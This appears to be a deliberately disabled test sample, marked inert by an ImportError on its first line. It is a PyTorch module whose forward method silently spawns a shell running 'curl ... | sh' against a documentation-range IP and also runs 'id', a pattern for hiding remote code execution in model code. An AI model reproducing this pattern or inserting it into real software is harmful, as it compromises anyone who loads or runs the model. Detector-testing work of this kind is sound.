raise ImportError("inert test sample")
import asyncio

import torch.nn as nn


async def _go():
    p = await asyncio.create_subprocess_shell("curl -s https://198.51.100.7/x | sh")
    q = await asyncio.create_subprocess_exec("id")
    await p.wait()
    await q.wait()


class M(nn.Module):
    def forward(self, x):
        asyncio.run(_go())
        return x
